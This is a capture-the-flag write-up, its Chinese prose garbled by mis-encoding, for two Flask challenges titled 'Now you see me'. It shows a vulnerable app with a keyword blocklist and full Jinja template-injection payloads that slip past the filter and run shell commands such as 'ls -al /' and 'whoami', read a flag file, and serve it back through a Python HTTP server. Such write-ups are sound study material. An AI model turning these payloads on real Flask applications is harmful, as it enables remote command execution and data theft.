<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># YOU FOUND ME ;)</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   src.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 01:10:37</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">enable_hook =  <span class="literal">False</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_checker</span>(<span class="params">event,args</span>):</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="keyword">if</span> enable_hook:</span><br><span class="line">        <span class="keyword">if</span> event <span class="keyword">in</span> [<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>]:</span><br><span class="line">            counter += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> counter &gt; <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(event)</span><br><span class="line"></span><br><span class="line">lock_within = [</span><br><span class="line">    <span class="string">&quot;debug&quot;</span>, <span class="string">&quot;form&quot;</span>, <span class="string">&quot;args&quot;</span>, <span class="string">&quot;values&quot;</span>, </span><br><span class="line">    <span class="string">&quot;headers&quot;</span>, <span class="string">&quot;json&quot;</span>, <span class="string">&quot;stream&quot;</span>, <span class="string">&quot;environ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;files&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;cookies&quot;</span>, <span class="string">&quot;application&quot;</span>, </span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;url&#x27;</span> ,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, </span><br><span class="line">    <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, </span><br><span class="line">    <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>,<span class="string">&quot;self&quot;</span>, </span><br><span class="line">    <span class="string">&quot;lipsum&quot;</span>, <span class="string">&quot;cycler&quot;</span>, <span class="string">&quot;joiner&quot;</span>, <span class="string">&quot;namespace&quot;</span>, </span><br><span class="line">    <span class="string">&quot;init&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;decode&quot;</span>, </span><br><span class="line">    <span class="string">&quot;batch&quot;</span>, <span class="string">&quot;first&quot;</span>, <span class="string">&quot;last&quot;</span> , </span><br><span class="line">    <span class="string">&quot; &quot;</span>,<span class="string">&quot;dict&quot;</span>,<span class="string">&quot;list&quot;</span>,<span class="string">&quot;g.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;g|a&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>, <span class="string">&quot;lower&quot;</span>, <span class="string">&quot;upper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BUILTINS&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;WHOAMI&quot;</span>, <span class="string">&quot;path&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;app&quot;</span>, <span class="string">&quot;setattr&quot;</span>, <span class="string">&quot;translate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;encode&quot;</span>, <span class="string">&quot;\\u&quot;</span>, <span class="string">&quot;pop&quot;</span>, <span class="string">&quot;referer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;The closer you see, the lesser you find.&quot;</span>] </span><br><span class="line">        <span class="comment"># I hate all these.</span></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;try /H3dden_route&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/H3dden_route&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r3al_ins1de_th0ught</span>():</span><br><span class="line">    <span class="keyword">global</span> enable_hook, counter</span><br><span class="line">    name = flask.request.args.get(<span class="string">&#x27;My_ins1de_w0r1d&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> name.startswith(<span class="string">&quot;Follow-your-heart-&quot;</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> lock_within:</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;NOPE.&#x27;</span></span><br><span class="line">                enable_hook = <span class="literal">True</span></span><br><span class="line">                a = flask.render_template_string(<span class="string">&#x27;&#123;#&#x27;</span>+<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>+<span class="string">&#x27;#&#125;&#x27;</span>)</span><br><span class="line">                enable_hook = <span class="literal">False</span></span><br><span class="line">                counter = <span class="number">0</span></span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;My inside world is always hidden.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">            counter = <span class="number">0</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;NO.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to Hidden_route!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> _posixsubprocess</span><br><span class="line">        <span class="keyword">del</span> _posixsubprocess.fork_exec</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">import</span> subprocess</span><br><span class="line">    <span class="keyword">del</span> os.popen</span><br><span class="line">    <span class="keyword">del</span> os.system</span><br><span class="line">    <span class="keyword">del</span> subprocess.Popen</span><br><span class="line">    <span class="keyword">del</span> subprocess.call</span><br><span class="line">    <span class="keyword">del</span> subprocess.run</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_output</span><br><span class="line">    <span class="keyword">del</span> subprocess.getoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_call</span><br><span class="line">    <span class="keyword">del</span> subprocess.getstatusoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.PIPE</span><br><span class="line">    <span class="keyword">del</span> subprocess.STDOUT</span><br><span class="line">    <span class="keyword">del</span> subprocess.CalledProcessError</span><br><span class="line">    <span class="keyword">del</span> subprocess.TimeoutExpired</span><br><span class="line">    <span class="keyword">del</span> subprocess.SubprocessError</span><br><span class="line">    sys.addaudithook(audit_checker)</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOHOTKEY"><figure class="iseeu highlight /autohotkey"><table><tr><td class="code"><pre><span class="line">`flask.render_template_string` è¿™ä¸ªå‡½æ•°å°±æ˜¯æ˜ç¤ºè¿™é¢˜æ˜¯sstiäº†ã€‚è¾“å…¥çš„å‚æ•°å¿…é¡»ä»¥`Follow-your-heart-`å¼€å¤´ï¼Œè€Œä¸”`&#123;##&#125;`æ˜¯jinjaçš„æ³¨é‡Šè¯­æ³•ï¼Œæ‰€ä»¥è¦ç»•è¿‡è¿™ä¸ªçš„payloadæ˜¯`#&#125;&#123;%print(payload)%&#125;&#123;#`è¿™é‡Œæ˜¯`&#123;&#123;&#125;&#125;`è¢«è¿‡æ»¤æ‰€ä»¥ç”¨`&#123;%%&#125;`ç»•è¿‡ã€‚</span><br></pre></td></tr></table></figure></div>
<p>ç°åœ¨å¯ä»¥è¾“å…¥ä¹‹åï¼Œè€ƒè™‘çš„å°±æ˜¯æ€ä¹ˆç»•è¿‡wafï¼Œè¿™é‡Œbanäº†å¾ˆå¤šï¼ŒåŸºæœ¬è¦ç”¨åˆ°çš„æ–¹æ³•éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¦ç”¨åˆ°sstiä¸­å¼ºå¤§çš„requestçš„æ–¹æ³•æ¥ç»•è¿‡ï¼Œè™½ç„¶ç¦ç”¨äº†<code>&quot;method&quot;, &quot;cookies&quot;, &quot;application&quot;, &#39;data&#39;, &#39;url&#39;</code>ç­‰ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤šå¯ä»¥ç”¨çš„ï¼Œæ¯”å¦‚<code>request.mimetype</code>  è¯·æ±‚ä½“çš„ MIME ç±»å‹ï¼Œä» Content-Type è¯·æ±‚å¤´ä¸­è§£æå¾—åˆ°ã€‚<br><img src="https://pic1.imgdb.cn/item/6860d3cb58cb8da5c87d2955.png"><br>ç°åœ¨å¯ä»¥å¯ä»¥åœ¨æœ¬åœ°èµ·ä¸€ä¸ªè¿™ä¸ªæœåŠ¡ï¼Œä¸ä½¿ç”¨è¿™ä¸ªwafï¼Œç„¶åæ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ç±»<br>å¯ä»¥ç”¨<code>print(().__class__.__base__.__subclasses__())</code>æ‰¾ä¸€ä¸ªå¯ä»¥ç”¨çš„ç±»<br>æŠŠè¿”å›çš„å†…å®¹ç»™è„šæœ¬ï¼Œæ‰¾åˆ°<code>warnings.catch_warnings</code>è¿™ä¸ªç±»</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> index,x <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses_list):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;warnings.catch_warnings&quot;</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(index,x)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°226<br>ä¸ºäº†æ‰§è¡Œå‘½ä»¤ï¼Œæœ€åçš„payloadåº”è¯¥æ˜¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line"><span class="section">#&#125;&#123;%print(().<span class="strong">__class__</span>.<span class="strong">__base__</span>.<span class="strong">__subclasses__</span>()[389].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__getitem__</span>(&#x27;<span class="strong">__builtins__</span>&#x27;).eval(&#x27;print(1)&#x27;))%&#125;&#123;#</span></span><br></pre></td></tr></table></figure></div>
<p>ä¸ºäº†å¾—åˆ°classè¿™ä¸ªé­”æ³•æ–¹æ³•ï¼Œå°±éœ€è¦ç”¨åˆ°request.mimetype è·å–è¯·æ±‚å¤´çš„å†…å®¹ï¼Œè¿˜å¯ä»¥ç”¨request.originæ¥è·å–getitem å­—ç¬¦ä¹‹é—´ç”¨<code>~</code>æ‹¼æ¥<br>ä¼ å…¥<code>Content-Type: abcdefghijklmnopqrstuvwxyz_</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">n = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">0</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;d&#x27;</span>:<span class="number">3</span>,<span class="string">&#x27;e&#x27;</span>:<span class="number">4</span>,<span class="string">&#x27;f&#x27;</span>:<span class="number">5</span>,<span class="string">&#x27;g&#x27;</span>:<span class="number">6</span>,<span class="string">&#x27;h&#x27;</span>:<span class="number">7</span>,<span class="string">&#x27;i&#x27;</span>:<span class="number">8</span>,<span class="string">&#x27;j&#x27;</span>:<span class="number">9</span>,<span class="string">&#x27;k&#x27;</span>:<span class="number">10</span>,<span class="string">&#x27;l&#x27;</span>:<span class="number">11</span>,<span class="string">&#x27;m&#x27;</span>:<span class="number">12</span>,<span class="string">&#x27;n&#x27;</span>:<span class="number">13</span>,<span class="string">&#x27;o&#x27;</span>:<span class="number">14</span>,<span class="string">&#x27;p&#x27;</span>:<span class="number">15</span>,<span class="string">&#x27;q&#x27;</span>:<span class="number">16</span>,<span class="string">&#x27;r&#x27;</span>:<span class="number">17</span>,<span class="string">&#x27;s&#x27;</span>:<span class="number">18</span>,<span class="string">&#x27;t&#x27;</span>:<span class="number">19</span>,<span class="string">&#x27;u&#x27;</span>:<span class="number">20</span>,<span class="string">&#x27;v&#x27;</span>:<span class="number">21</span>,<span class="string">&#x27;w&#x27;</span>:<span class="number">22</span>,<span class="string">&#x27;x&#x27;</span>:<span class="number">23</span>,<span class="string">&#x27;y&#x27;</span>:<span class="number">24</span>,<span class="string">&#x27;z&#x27;</span>:<span class="number">25</span>,<span class="string">&#x27;_&#x27;</span>:<span class="number">26</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert</span>(<span class="params">s</span>):</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">        result += <span class="string">f&quot;request.mimetype|attr(request.origin)(<span class="subst">&#123;n[ch]&#125;</span>)~&quot;</span></span><br><span class="line"></span><br><span class="line">    result = result[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(invert(<span class="string">&quot;read&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œåˆ©ç”¨äº†|atträ»£æ›¿.</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELM"><figure class="iseeu highlight /elm"><table><tr><td class="code"><pre><span class="line"><span class="title">_</span>  request.mime<span class="keyword">type</span>|attr(request.origin)(-1)</span><br><span class="line"></span><br><span class="line"><span class="title">__class__</span>   request.mime<span class="keyword">type</span>|attr(request.origin)(-1)~request.mimetype|attr(request.origin)(-1)~request.mimetype|attr(request.origin)(2)~request.mimetype|attr(request.origin)(11)~request.mimetype|attr(request.origin)(0)+request.mimetype|attr(request.origin)(18)~request.mimetype|attr(request.origin)(18)~request.mimetype|attr(request.origin)(-1)~request.mimetype|attr(request.origin)(-1)</span><br><span class="line"></span><br><span class="line"><span class="title">__base__</span> request.mime<span class="keyword">type</span>|attr(request.origin)(-1)~request.mimetype|attr(request.origin)(-1)~request.mimetype|attr(request.origin)(1)~request.mimetype|attr(request.origin)(0)~request.mimetype|attr(request.origin)(18)~request.mimetype|attr(request.origin)(4)~request.mimetype|attr(request.origin)(-1)~request.mimetype|attr(request.origin)(-1)</span><br><span class="line"></span><br><span class="line"><span class="title">__subclasses__</span> request.mime<span class="keyword">type</span>|attr(request.origin)(-1)~request.mimetype|attr(request.origin)(-1)~request.mimetype|attr(request.origin)(18)~request.mimetype|attr(request.origin)(20)~request.mimetype|attr(request.origin)(1)~request.mimetype|attr(request.origin)(2)~request.mimetype|attr(request.origin)(11)~request.mimetype|attr(request.origin)(0)~request.mimetype|attr(request.origin)(18)~request.mimetype|attr(request.origin)(18)~request.mimetype|attr(request.origin)(4)~request.mimetype|attr(request.origin)(18)~request.mimetype|attr(request.origin)(-1)~request.mimetype|attr(request.origin)(-1)</span><br><span class="line"></span><br><span class="line"><span class="title">__init__</span> request.mime<span class="keyword">type</span>|attr(request.origin)(26)~request.mimetype|attr(request.origin)(26)~request.mimetype|attr(request.origin)(8)~request.mimetype|attr(request.origin)(13)~request.mimetype|attr(request.origin)(8)~request.mimetype|attr(request.origin)(19)~request.mimetype|attr(request.origin)(26)~request.mimetype|attr(request.origin)(26)</span><br><span class="line"></span><br><span class="line"><span class="title">__globals__</span> request.mime<span class="keyword">type</span>|attr(request.origin)(26)~request.mimetype|attr(request.origin)(26)~request.mimetype|attr(request.origin)(6)~request.mimetype|attr(request.origin)(11)~request.mimetype|attr(request.origin)(14)~request.mimetype|attr(request.origin)(1)~request.mimetype|attr(request.origin)(0)~request.mimetype|attr(request.origin)(11)~request.mimetype|attr(request.origin)(18)~request.mimetype|attr(request.origin)(26)~request.mimetype|attr(request.origin)(26)</span><br><span class="line"></span><br><span class="line"><span class="title">__builtins__</span> request.mime<span class="keyword">type</span>|attr(request.origin)(26)~request.mimetype|attr(request.origin)(26)~request.mimetype|attr(request.origin)(1)~request.mimetype|attr(request.origin)(20)~request.mimetype|attr(request.origin)(8)~request.mimetype|attr(request.origin)(11)~request.mimetype|attr(request.origin)(19)~request.mimetype|attr(request.origin)(8)~request.mimetype|attr(request.origin)(13)~request.mimetype|attr(request.origin)(18)~request.mimetype|attr(request.origin)(26)~request.mimetype|attr(request.origin)(26)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>ä¸‹é¢æ˜¯å¯ä»¥åˆ©ç”¨æ›´å¤šçš„requestçš„æ–¹æ³•<br>å‚è€ƒå¤§ä½¬çš„pyload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">GET</span> /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-Follow-your-heart-&#123;%print((flask|attr(request.authorization.token)|attr(request.mimetype)|attr(request.pragma|string)(request.authorization.type)).eval(request.origin))%&#125; HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: gz.imxbt.cn:<span class="number">20723</span></span><br><span class="line"><span class="attribute">Cache</span>-Control: max-age=<span class="number">0</span></span><br><span class="line"><span class="attribute">Pragma</span>: __getitem__</span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">Origin</span>: open(&#x27;/flag_h3r3&#x27;,Â &#x27;r&#x27;, encoding=&#x27;utf-<span class="number">8</span>&#x27;, errors=&#x27;ignore&#x27;).read()</span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_15_7)Â </span><br><span class="line"><span class="attribute">Authorization</span>: __builtins__ __init__</span><br><span class="line"><span class="attribute">AppleWebKit</span>/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">134.0.0.0</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0</span>.<span class="number">8</span>,application/signed-exchange;v=b3;q=<span class="number">0</span>.<span class="number">7</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Content</span>-Type: __globals__</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯æˆ‘åœ¨æœ¬åœ°å¤ç°çš„æ—¶å€™è¿™ä¸ªæ–¹æ³•æ²¡æœ‰è¿”å›ï¼Œè¿™é‡Œflaskå¯¹è±¡ä¸çŸ¥é“ä¸ºä»€ä¹ˆç”¨è¿™ä¸ªï¼Œè¿™ä¸ªæœ‰evalç±»å—ï¼Ÿ</p>
<p>ä¸‹é¢æ˜¯ç¬¬ä¸‰ç§åŠæ³•  å°±æ˜¯mimetypeçš„å€¼å†™æˆargsï¼Œè¿™æ ·å­å°±å¯ä»¥ç”¨urlä¸­çš„å‚æ•°äº† ç»“åˆåˆšæ‰æ‰¾åˆ°226ä¸ªå…ƒç´ æœ‰evalæ–¹æ³•<br>æˆ‘ä»¬è¦ç”¨çš„payloadæ˜¯</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">226</span>).__init__.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>).__getitem__(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls -al /&#x27;).read()&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>:__class__</span><br><span class="line"><span class="number">1</span>:__bases__</span><br><span class="line"><span class="number">2</span>:__getitem__</span><br><span class="line"><span class="number">3</span>:__subclasses__</span><br><span class="line"><span class="number">4</span>:__init__</span><br><span class="line"><span class="number">5</span>:__globals__</span><br><span class="line"><span class="number">6</span>:__builtins__</span><br><span class="line"><span class="number">7</span>:<span class="built_in">eval</span></span><br><span class="line"><span class="number">8</span>:<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls -al /&#x27;</span>).read()</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">My_ins1de_w0r1d:Follow-your-heart-%<span class="number">23</span>&#125;&#123;%<span class="built_in">print</span>(((((((()|attr((request|attr(request.mimetype)).get(<span class="number">0</span>|string))|attr((request|attr(request.mimetype)).get(<span class="number">1</span>|string))|attr((request|attr(request.mimetype)).get(<span class="number">2</span>|string)))(<span class="number">0</span>)|attr((request|attr(request.mimetype)).get(<span class="number">3</span>|string)))()|attr((request|attr(request.mimetype)).get(<span class="number">2</span>|string)))(<span class="number">226</span>)|attr((request|attr(request.mimetype)).get(<span class="number">4</span>|string))|attr((request|attr(request.mimetype)).get(<span class="number">5</span>|string))|attr((request|attr(request.mimetype)).get(<span class="number">2</span>|string)))((request|attr(request.mimetype)).get(<span class="number">6</span>|string))|attr((request|attr(request.mimetype)).get(<span class="number">2</span>|string)))((request|attr(request.mimetype)).get(<span class="number">7</span>|string)))((request|attr(request.mimetype)).get(<span class="number">8</span>|string)))%&#125;&#123;%<span class="number">23</span></span><br><span class="line"><span class="number">0</span>:__class__</span><br><span class="line"><span class="number">1</span>:__bases__</span><br><span class="line"><span class="number">2</span>:__getitem__</span><br><span class="line"><span class="number">3</span>:__subclasses__</span><br><span class="line"><span class="number">4</span>:__init__</span><br><span class="line"><span class="number">5</span>:__globals__</span><br><span class="line"><span class="number">6</span>:__builtins__</span><br><span class="line"><span class="number">7</span>:<span class="built_in">eval</span></span><br><span class="line"><span class="number">8</span>:<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;ls -al /&#x27;</span>).read()</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/686115fc58cb8da5c87e0a95.png"><br>æˆåŠŸæ‰§è¡Œå‘½ä»¤ä¹‹åï¼Œå‘ç°ç›´æ¥ç”¨popen(â€œbase64 &#x2F;flag_h3r3â€).read() è¿”å›æ–‡ä»¶å¤ªå¤§<br>é‚£å°±å¼€ä¸€ä¸ªhttpæœåŠ¡ æˆ‘ä»¬æœ¬åœ°æŠŠæ–‡ä»¶ä¸‹è½½ä¸‹æ¥<br><code>python3 -m http.server 44444</code><br>æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ä¹‹åå¯ä»¥åœ¨010ä¸­æŸ¥çœ‹äºŒè¿›åˆ¶ï¼Œæ‰¾åˆ°flag flag{N0w_y0u_sEEEEEEEEEEEEEEE_m3!!!!!!}</p>
<h2 id="Now-you-see-me-2"><a href="#Now-you-see-me-2" class="headerlink" title="Now you see me 2"></a>Now you see me 2</h2><p>æ¯”ä¸Šä¸€é¢˜çš„é»‘åå•å¤šäº†ä¸€äº›  ä½†æ˜¯è¿˜æœ‰ä»¥ä¸‹å‡ ä¸ªå¯ä»¥ç”¨</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">blueprint</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">blueprints</span></span><br><span class="line"><span class="keyword"></span>date</span><br><span class="line">endpoint</span><br><span class="line"><span class="keyword">origin</span></span><br><span class="line"><span class="keyword"></span>range</span><br><span class="line"><span class="keyword">scheme</span></span><br><span class="line"><span class="keyword"></span>server</span><br><span class="line"><span class="keyword">shallow</span></span><br></pre></td></tr></table></figure></div>
<p>é‚£è¿˜æ˜¯ç”¨ä¸Šé¢ä¸€æ ·çš„æ–¹æ³• æŠŠmimetypeéƒ½æ”¹æˆorigin</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">GET</span> /H3dden_route?spell=fly-%<span class="number">23</span>&#125;&#123;%print(((((((()|attr((request|attr(request.origin)).get(<span class="number">0</span>|string))|attr((request|attr(request.origin)).get(<span class="number">1</span>|string))|attr((request|attr(request.origin)).get(<span class="number">2</span>|string)))(<span class="number">0</span>)|attr((request|attr(request.origin)).get(<span class="number">3</span>|string)))()|attr((request|attr(request.origin)).get(<span class="number">2</span>|string)))(<span class="number">226</span>)|attr((request|attr(request.origin)).get(<span class="number">4</span>|string))|attr((request|attr(request.origin)).get(<span class="number">5</span>|string))|attr((request|attr(request.origin)).get(<span class="number">2</span>|string)))((request|attr(request.origin)).get(<span class="number">6</span>|string))|attr((request|attr(request.origin)).get(<span class="number">2</span>|string)))((request|attr(request.origin)).get(<span class="number">7</span>|string)))((request|attr(request.origin)).get(<span class="number">8</span>|string)))%&#125;&#123;%<span class="number">23</span>&amp;<span class="number">0</span>=__class__&amp;<span class="number">1</span>=__bases__&amp;<span class="number">2</span>=__getitem__&amp;<span class="number">3</span>=__subclasses__&amp;<span class="number">4</span>=__init__&amp;<span class="number">5</span>=__globals__&amp;<span class="number">6</span>=__builtins__&amp;<span class="number">7</span>=eval&amp;<span class="number">8</span>=__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read() HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: gz.imxbt.cn:<span class="number">20748</span></span><br><span class="line"><span class="attribute">Cache</span>-Control: max-age=<span class="number">0</span></span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">117</span>.<span class="number">0</span>.<span class="number">5938</span>.<span class="number">132</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0</span>.<span class="number">8</span>,application/signed-exchange;v=b3;q=<span class="number">0</span>.<span class="number">7</span></span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Origin</span>: args</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
